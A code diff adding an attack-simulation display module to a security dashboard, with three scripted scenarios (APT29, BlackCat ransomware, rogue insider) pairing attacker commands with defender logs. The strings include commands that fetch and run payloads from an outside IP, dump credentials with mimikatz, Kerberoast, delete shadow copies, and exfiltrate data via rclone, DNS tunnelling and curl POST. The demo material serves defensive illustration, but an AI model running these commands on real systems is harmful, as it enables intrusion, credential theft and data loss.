@@ -5252,3 +5252,316 @@ function updateLiveSimButtons(isRunning, isPaused, stageNum = 1, isCompleted = f
     if (railLabel) railLabel.textContent = '▶ Run Live Attack Simulation';
   }
 }
+
+
+
+// ═══════════════════════════════════════════════════════════════════════════
+// 16. ATTACK SIMULATION THEATER CONTROLLER
+// ═══════════════════════════════════════════════════════════════════════════
+
+state.attackSimTheater = {
+  currentScenario: 'apt29',
+  scenarios: {
+    apt29: {
+      name: "APT29 Cozy Bear (State-Sponsored Infiltration)",
+      stages: [
+        {
+          stage: 1,
+          name: "Phishing Ingress",
+          tactic: "T1566.001 Spearphishing",
+          sourceNode: 1,
+          targetNode: 2,
+          attackerCmd: "curl -s -A 'Mozilla/5.0' http://185.220.101.47/files/Q4_Statement.xlsm -o C:\\Users\\m_thorne\\Downloads\\Q4_Statement.xlsm\nwscript.exe /e:VBScript C:\\Users\\m_thorne\\Downloads\\Q4_Statement.xlsm",
+          defenderLogs: "[01:15:02] WIN_EVENT 4624: Successful Logon (Type 3) from 185.220.101.47 (TOR Exit Node)\n[01:15:08] EMAIL_GATEWAY: Inbound attachment SHA256 matches STIX 2.1 Threat Indicator\n[01:15:14] EDR_HOOK: Suspicious execution detected on workstation wkst-04-dev"
+        },
+        {
+          stage: 2,
+          name: "Code Execution & Memory Injection",
+          tactic: "T1059.001 PowerShell",
+          sourceNode: 2,
+          targetNode: 3,
+          attackerCmd: "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...\nprivilege::debug\nsekurlsa::logonpasswords exit",
+          defenderLogs: "[01:16:30] SYSMON EVENT 1: Process Create (Parent: EXCEL.EXE -> powershell.exe)\n[01:16:35] AUDIT_SECURITY 4672: SeDebugPrivilege assigned to process PID 4812\n[01:16:42] MEMORY_SCANNER: LSASS memory read attempt blocked & flagged by sensor"
+        },
+        {
+          stage: 3,
+          name: "Credential Harvesting & AD Recon",
+          tactic: "T1558.003 Kerberoasting",
+          sourceNode: 3,
+          targetNode: 5,
+          attackerCmd: "Get-ADUser -Filter * -Properties Name,PasswordLastSet,MemberOf | Export-Csv ad_users.csv\nInvoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII krb_tgs_hashes.txt",
+          defenderLogs: "[01:18:14] WIN_EVENT 4769: A Kerberos service ticket was requested for DC-01 (RC4-HMAC)\n[01:18:22] ZEEL_LOG: Abnormal LDAP query burst: 45 queries in 300ms from wkst-04-dev\n[01:18:31] MITRE_ALERT: T1558.003 Kerberoasting signature matched with 96% confidence"
+        },
+        {
+          stage: 4,
+          name: "Lateral Pivot & Inferred Gap-Bridge",
+          tactic: "T1021.002 SMB / Inferred Bridge",
+          sourceNode: 2,
+          targetNode: 4,
+          attackerCmd: "psexec.exe \\\\srv-file-02 -u Administrator -p 'P@ssw0rd2026' cmd.exe /c whoami /all\nxcopy C:\\Confidential\\Financials\\*.* \\\\srv-file-02\\Shared\\Backup\\",
+          defenderLogs: "[01:19:45] MULTIDIGRAPH_ENGINE: Telemetry silence between Subnets 10.0.1.x and 10.0.2.x\n[01:19:50] AI_GAP_BRIDGE: Shortest-path causal bridge synthesized (wkst-04-dev -> srv-file-02)\n[01:20:02] PENALTY_SCORER: Inferred bridge penalizes confidence from 0.95 to 0.84"
+        },
+        {
+          stage: 5,
+          name: "C2 Beacon & Honeypot Decoy Trip",
+          tactic: "T1071.001 Web Protocols",
+          sourceNode: 5,
+          targetNode: 6,
+          attackerCmd: "nmap -sT -p 22,80,445,2222 10.0.3.0/24\nssh -i id_rsa -p 2222 root@ssh-honeypot-dmz.internal",
+          defenderLogs: "[01:21:05] COWRIE_DECOY: Adversary probed honeypot trap 'ssh-honeypot-dmz' on port 2222\n[01:21:12] DECEPTION_CORRELATION: Honeypot attacker signature matches confirmed Patient Zero 185.220.101.47!\n[01:21:20] ZEEL_DNS: Outbound C2 beaconing to external IP 185.220.101.5 confirmed"
+        },
+        {
+          stage: 6,
+          name: "Autonomous Containment & Seal",
+          tactic: "NIST SP 800-61 Lockdown",
+          sourceNode: 5,
+          targetNode: 7,
+          attackerCmd: "[CONNECTION TERMINATED BY NETWORK SECURITY GATEWAY]\n[ERR] Socket closed by remote host (Firewall drop rule applied)",
+          defenderLogs: "[01:22:18] PLAYBOOK_EXEC: Host wkst-04-dev isolated via EDR agent\n[01:22:25] AD_LOCKDOWN: Kerberos ticket for m_thorne revoked; egress port blocked\n[01:22:34] MERKLE_SEAL: Audit ledger sealed with SHA-256 root: 7d4a8e29f3b1... (Zero False Positives)"
+        }
+      ]
+    },
+    ransomware: {
+      name: "BlackCat / ALPHV Ransomware Double Extortion",
+      stages: [
+        {
+          stage: 1,
+          name: "Initial Ingress (VPN)",
+          tactic: "T1078 Valid Accounts",
+          sourceNode: 1,
+          targetNode: 2,
+          attackerCmd: "openvpn --config vpn_client.ovpn --auth-user-pass stolen_vpn_creds.txt",
+          defenderLogs: "[02:00:10] VPN_GATEWAY: Successful connection from unmanaged IP 194.26.29.112\n[02:00:18] IAM_ALERT: Geo-velocity anomaly: User logged in from London & Singapore within 5 mins"
+        },
+        {
+          stage: 2,
+          name: "Shadow Copy Deletion",
+          tactic: "T1490 Inhibit System Recovery",
+          sourceNode: 2,
+          targetNode: 3,
+          attackerCmd: "vssadmin.exe delete shadows /all /quiet\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
+          defenderLogs: "[02:01:45] SYSMON EVENT 1: vssadmin executed with parameter 'delete shadows'\n[02:01:52] VOLUME_PROTECT: System restore shadow copies deleted on wkst-04-dev"
+        },
+        {
+          stage: 3,
+          name: "Domain Admin Compromise",
+          tactic: "T1078.002 Domain Accounts",
+          sourceNode: 3,
+          targetNode: 5,
+          attackerCmd: "net group \"Domain Admins\" /domain\nnltest /dclist:internal.corp",
+          defenderLogs: "[02:03:10] AD_AUDIT: High-risk group 'Domain Admins' enumerated from compromised workstation\n[02:03:25] KERBEROS: Privilege ticket grant verified"
+        },
+        {
+          stage: 4,
+          name: "Data Exfiltration Staging",
+          tactic: "T1560 Archive Collected Data",
+          sourceNode: 2,
+          targetNode: 4,
+          attackerCmd: "7z.exe a -p'B1ackCat2026!' -mhe=on C:\\Temp\\exfil.7z \\\\srv-file-02\\Financials\\*",
+          defenderLogs: "[02:04:30] DLP_SENSOR: Mass archiving of sensitive documents detected in C:\\Temp\n[02:04:42] FILE_AUDIT: 840 files copied within 40 seconds"
+        },
+        {
+          stage: 5,
+          name: "C2 Mega Exfiltration",
+          tactic: "T1567 Exfiltration Over Web Service",
+          sourceNode: 4,
+          targetNode: 7,
+          attackerCmd: "rclone.exe copy C:\\Temp\\exfil.7z mega:backup_leaks/ --transfers=10",
+          defenderLogs: "[02:06:05] FIREWALL_EGRESS: 4.2 GB data transfer burst to external IP 185.220.101.5\n[02:06:14] C2_MONITOR: High-volume outbound flow flagged"
+        },
+        {
+          stage: 6,
+          name: "Automated Blast Containment",
+          tactic: "Autonomous Containment",
+          sourceNode: 5,
+          targetNode: 2,
+          attackerCmd: "[KILL_SIGNAL]: Ransomware process killed by EDR heuristic sensor",
+          defenderLogs: "[02:07:30] ZERO_DAY_DEFENDER: Cryptolocker binary signature halted; network severed\n[02:07:45] INCIDENT_SEALED: Ransomware execution thwarted before mass encryption"
+        }
+      ]
+    },
+    insider: {
+      name: "Rogue Insider Token Exfiltration",
+      stages: [
+        {
+          stage: 1,
+          name: "Off-Hours Secret Retrieval",
+          tactic: "T1078 Valid Accounts",
+          sourceNode: 2,
+          targetNode: 3,
+          attackerCmd: "ssh -i id_rsa_devops deployer@dc-01.internal 'cat /etc/vault/token.json'",
+          defenderLogs: "[03:10:05] SSHD: PAM session opened for user 'deployer' outside scheduled maintenance window\n[03:10:12] VAULT_AUDIT: Root secret token exported"
+        },
+        {
+          stage: 2,
+          name: "Database Snapshot Dump",
+          tactic: "T1530 Data from Cloud Storage",
+          sourceNode: 3,
+          targetNode: 5,
+          attackerCmd: "mysqldump --all-databases -h db-prod-01 -u root -p > /tmp/prod_dump.sql",
+          defenderLogs: "[03:11:30] DB_AUDIT: Full database dump command executed across 18 schemas\n[03:11:42] TABLE_READ: 120,000 customer records queried"
+        },
+        {
+          stage: 3,
+          name: "DNS Tunneling Probe",
+          tactic: "T1071.004 DNS Tunneling",
+          sourceNode: 5,
+          targetNode: 4,
+          attackerCmd: "python3 -c \"import socket; [socket.gethostbyname(f'{x}.exfil.net') for x in ['data1','data2']]\"",
+          defenderLogs: "[03:13:00] SURICATA_ALERT: Suspicious high-entropy TXT DNS queries to .net domain\n[03:13:10] DNS_RATE_LIMITER: Tunneling pattern recognized"
+        },
+        {
+          stage: 4,
+          name: "Lateral File Stage",
+          tactic: "T1021.002 SMB",
+          sourceNode: 4,
+          targetNode: 6,
+          attackerCmd: "scp /tmp/prod_dump.sql root@srv-file-02:/var/www/html/backup.zip",
+          defenderLogs: "[03:14:15] INFERRED_CORRELATION: Lateral hop matched to staging web root\n[03:14:25] AI_ENGINE: Inferred causal link confirmed with 88% confidence"
+        },
+        {
+          stage: 5,
+          name: "Canary Token Trip",
+          tactic: "T1052 Exfiltration Over Physical Media",
+          sourceNode: 6,
+          targetNode: 7,
+          attackerCmd: "curl -X POST -F 'file=@/var/www/html/backup.zip' http://185.220.101.5/drop",
+          defenderLogs: "[03:15:30] CANARY_ALERT: Embedded deception canary token tripped! Forensic alarm triggered\n[03:15:42] ATTRIBUTION: Activity tied directly to deployer identity"
+        },
+        {
+          stage: 6,
+          name: "DevOps Credential Revocation",
+          tactic: "Automated Incident Containment",
+          sourceNode: 5,
+          targetNode: 2,
+          attackerCmd: "[SESSION REVOKED] Keypair invalidated by Identity Provider",
+          defenderLogs: "[03:16:30] SSO_REVOKE: User deployer session severed; SSH keys deleted\n[03:16:45] COMPLIANCE_SEAL: Court-admissible forensic export ready for legal review"
+        }
+      ]
+    }
+  }
+};
+
+function openAttackSimModal() {
+  const modal = document.getElementById('attack-sim-modal');
+  if (!modal) return;
+  modal.style.display = 'flex';
+  document.body.style.overflow = 'hidden';
+
+  renderSimTimelineNav();
+  updateAttackSimStage(state.liveSim.currentStage || 1);
+
+  if (!state.liveSim.isRunning) {
+    startLiveDemoSimulation();
+  }
+}
+
+function closeAttackSimModal() {
+  const modal = document.getElementById('attack-sim-modal');
+  if (modal) modal.style.display = 'none';
+  document.body.style.overflow = '';
+}
+
+function handleAttackSimOverlayClick(e) {
+  if (e.target && e.target.id === 'attack-sim-modal') {
+    closeAttackSimModal();
+  }
+}
+
+function changeSimScenario(scenarioKey) {
+  state.attackSimTheater.currentScenario = scenarioKey;
+  renderSimTimelineNav();
+  updateAttackSimStage(1);
+  restartLiveDemoSimulation();
+}
+
+function renderSimTimelineNav() {
+  const container = document.getElementById('sim-modal-timeline');
+  if (!container) return;
+
+  const scenario = state.attackSimTheater.scenarios[state.attackSimTheater.currentScenario] || state.attackSimTheater.scenarios.apt29;
+  container.innerHTML = scenario.stages.map((st, idx) => {
+    const isCur = st.stage === state.liveSim.currentStage;
+    return `
+      <button type="button" class="sim-stage-step-btn ${isCur ? 'active' : ''}" id="sim-btn-stage-${st.stage}" onclick="updateAttackSimStage(${st.stage})">
+        <span class="sim-step-num">STAGE ${st.stage}</span>
+        <span class="sim-step-title">${escapeHtml(st.name)}</span>
+      </button>
+    `;
+  }).join('');
+}
+
+function updateAttackSimStage(stageNum) {
+  state.liveSim.currentStage = stageNum;
+  const scenario = state.attackSimTheater.scenarios[state.attackSimTheater.currentScenario] || state.attackSimTheater.scenarios.apt29;
+  const stage = scenario.stages[stageNum - 1];
+  if (!stage) return;
+
+  // 1. Highlight buttons in modal timeline
+  document.querySelectorAll('.sim-stage-step-btn').forEach((b, idx) => {
+    b.classList.toggle('active', (idx + 1) === stageNum);
+  });
+
+  // 2. Update Terminals
+  const termTactic = document.getElementById('sim-term-tactic');
+  if (termTactic) termTactic.textContent = stage.tactic;
+
+  const cliBox = document.getElementById('sim-attacker-cli');
+  if (cliBox) {
+    cliBox.innerHTML = `
+      <div><span class="sim-cli-prompt">root@kali:~#</span><span class="sim-cli-cmd">${stage.attackerCmd.replace(/\\n/g, '<br><span class="sim-cli-prompt">root@kali:~#</span> ')}</span></div>
+      <div class="sim-cli-out">[+] Executed with code 0. Attack pipeline advancing to Stage ${stageNum}...</div>
+    `;
+  }
+
+  const defBox = document.getElementById('sim-defender-telemetry');
+  if (defBox) {
+    const lines = stage.defenderLogs.split('\\n');
+    defBox.innerHTML = lines.map(l => {
+      const isCrit = l.includes('ALERT') || l.includes('blocked');
+      const isWarn = l.includes('GAP') || l.includes('PENALTY');
+      const cls = isCrit ? 'sim-log-alert' : (isWarn ? 'sim-log-warn' : 'sim-log-ok');
+      return `<div class="${cls}">${escapeHtml(l)}</div>`;
+    }).join('');
+  }
+
+  // 3. Highlight SVG Network Nodes & Edges
+  for (let i = 1; i <= 6; i++) {
+    const edge = document.getElementById(`sim-edge-${i}`);
+    if (edge) {
+      if (i <= stageNum) {
+        edge.style.opacity = '1';
+        edge.classList.add('sim-laser-beam');
+      } else {
+        edge.style.opacity = '0.2';
+        edge.classList.remove('sim-laser-beam');
+      }
+    }
+  }
+
+  // 4. Update Metrics Dials
+  const kpis = {
+    1: { snr: "48 → 1", pz: "185.220.101.47", br: "1 Asset", conf: "74.0%", status: "INGESTION PHASE" },
+    2: { snr: "96 → 2", pz: "wkst-04-dev", br: "2 Assets", conf: "82.0%", status: "PROCESS DETECTED" },
+    3: { snr: "180 → 3", pz: "wkst-04-dev", br: "3 Assets", conf: "89.0%", status: "AD RECON FLAGGED" },
+    4: { snr: "240 → 5", pz: "wkst-04-dev", br: "4 Assets", conf: "84.0%", status: "GAP-BRIDGING APPLIED" },
+    5: { snr: "310 → 6", pz: "wkst-04-dev", br: "5 Assets", conf: "94.0%", status: "DECEPTION TRIGGERED" },
+    6: { snr: "350 → 7", pz: "185.220.101.47", br: "5 Assets", conf: "95.8%", status: "ISOLATED & SEALED" }
+  };
+  const m = kpis[stageNum] || kpis[6];
+  if (document.getElementById('sim-kpi-snr')) document.getElementById('sim-kpi-snr').textContent = m.snr;
+  if (document.getElementById('sim-kpi-pz')) document.getElementById('sim-kpi-pz').textContent = m.pz;
+  if (document.getElementById('sim-kpi-br')) document.getElementById('sim-kpi-br').textContent = m.br;
+  if (document.getElementById('sim-kpi-conf')) document.getElementById('sim-kpi-conf').textContent = m.conf;
+  if (document.getElementById('sim-kpi-status')) document.getElementById('sim-kpi-status').textContent = m.status;
+
+  // Sync to Cockpit Storyboard
+  if (typeof activateAttackStage === 'function') {
+    activateAttackStage(stageNum);
+  }
+}
+
+function applyAttackSimulationToCockpit() {
+  closeAttackSimModal();
+  scrollToSection('cockpit');
+}
